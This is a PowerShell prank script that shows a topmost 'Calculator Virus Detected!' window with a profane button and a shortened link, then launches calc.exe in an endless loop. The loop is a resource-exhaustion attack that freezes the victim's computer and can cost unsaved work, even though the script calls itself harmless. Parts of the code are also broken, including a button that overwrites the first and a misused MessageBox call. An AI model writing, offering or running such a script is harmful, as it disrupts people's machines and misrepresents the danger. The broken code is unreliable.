Add-Type -AssemblyName PresentationFramework
$popup = New-Object System.Windows.Window
$popup.Title = "Calculator Virus Detected!"
$popup.WindowStyle = 'ToolWindow'
$popup.WindowStartupLocation = 'CenterScreen'
$popup.SizeToContent = 'WidthAndHeight'
$popup.Topmost = $true
$popup.ResizeMode = 'NoResize'

$okButton = New-Object System.Windows.Controls.Button
$okButton.Content = "OK"
$okButton.Add_Click({$popup.Close()})
$popup.Content = $okButton

$howButton = New-Object System.Windows.Controls.Button
$howButton.Content = "HOW THE FUCK?"
$howButton.Add_Click({$msg = New-Object System.Windows.MessageBox; $msg.ShowDialog("Calculator virus is a harmless prank virus. You can learn more about it at: http://bit.ly/3nnak7s")})
$popup.Content = $howButton

$popup.ShowDialog()

while($true) {
    Start-Process calc.exe
}
